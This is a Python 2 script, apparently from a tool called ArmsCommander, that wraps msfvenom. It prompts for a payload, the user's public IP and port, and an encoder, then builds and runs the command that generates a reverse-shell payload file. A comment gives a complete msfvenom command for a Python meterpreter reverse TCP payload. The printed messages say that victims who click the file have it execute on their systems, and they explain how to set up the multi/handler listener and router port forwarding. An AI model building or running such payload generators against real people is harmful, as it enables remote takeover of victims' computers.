# coding=UTF-8

import os
import socket
import operator
from termcolor import colored
import sys
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen

global show_banner
global main_Opt_Choice
global scan_Target
global scan_Save
scan_Target = None
scan_Save = None

os.system('cat /root/ArmsCommander/msfvenomHowToGuide.txt')

#msfvenom -p python/meterpreter_reverse_tcp LHOST=YOUR PUBLIC IP ADDRESS LPORT=443 -b "\x00" -f raw -o /root/payloads/samplePayloadPythonReverseTCP.py

def make_Bind_Shell():
    return
def make_Reverse_Shell():

    payload_Specified = str(raw_input("Specify a payload: "))
    your_Public_IP = str(raw_input("Enter your Public IP: "))
    your_Public_Port = str(raw_input("Enter your public port, before it reaches your router: "))
    your_Encoder = str(raw_input("Enter your encoder (or none if you don't want to): "))
    your_File_Format = str(raw_input("Enter your output file format: "))
    your_Output_File = str(raw_input("Enter the full path of the output payload: "))
    nullbyte = "x00"
    if your_Encoder == "":
        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -f {3} -o {4}""".format(
            payload_Specified,
            your_Public_IP,
            your_Public_Port,
            your_File_Format,
            your_Output_File
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
        print colored('Congratulations, you have built your own payload. When they click on this then it will execute in their systems','red','on_white')
        print """
        Please do not forget to use multi/handler and set

        LHOST = Your private IP (10.0.1.x or 192.168.x.x)
        LPORT = 8080 or 4444

        And to port-forward your router from port 443 to port 8080
        """
    else:#FIXED #Bug discovered, cannot add null byte \x00 to string for some reason
        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -b "\{3}" -e {4} -f {5} -o {6}""".format(
                                payload_Specified,
                                your_Public_IP,
                                your_Public_Port,
                                nullbyte,#FIXED # This doesnt work either.
                                your_Encoder,
                                your_File_Format,
                                your_Output_File

        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
        print colored('Congratulations, you have built your own payload. When they click on this then it will execute in their systems','red','on_white')
        print """
        Please do not forget to use multi/handler and set

        LHOST = Your private IP (10.0.1.x or 192.168.x.x)
        LPORT = 8080 or 4444

        And to port-forward your router from port 443 to port 8080
        """


def main():
    opt_List = [
        '\n\t#1. Launch a bind shell',
        '#2. Create your own reverse shell payload'
    ]

    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input(""))

    if opt_Choice == "1":
        os.system('clear')
        make_Bind_Shell()
    elif opt_Choice == "2":
        os.system('clear')
        make_Reverse_Shell()
    else:
        print colored ('You have entered a invalid option','red','on_white')
        main()
main()
